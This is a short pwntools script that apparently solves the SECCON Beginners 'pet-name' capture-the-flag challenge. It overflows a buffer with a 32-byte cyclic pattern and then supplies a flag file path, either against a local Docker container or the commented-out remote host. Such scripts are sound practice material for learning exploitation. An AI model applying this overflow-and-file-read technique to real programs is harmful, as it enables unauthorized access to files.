from pwn import *

p: tube = process("docker run -i s4b25-petname:latest /home/pwn/chall", shell=True)
# p: tube = remote("pet-name.challenges.beginners.seccon.jp", 9080)

p.send(cyclic(32))
p.sendline(b"/home/pwn/flag.txt")

sleep(5)
